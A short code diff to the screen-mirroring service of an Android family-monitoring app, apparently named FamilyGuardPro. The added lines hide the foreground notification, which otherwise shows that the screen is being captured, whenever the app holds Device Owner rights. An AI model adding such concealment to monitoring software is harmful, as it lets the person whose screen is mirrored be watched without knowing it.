@@ -167,6 +167,11 @@ class ScreenMirrorService : Service() {
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
+        
+        // Suppress notification in Device Owner mode
+        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
+            this, NOTIFICATION_ID
+        )
     }
 
     private fun startBackgroundThread() {
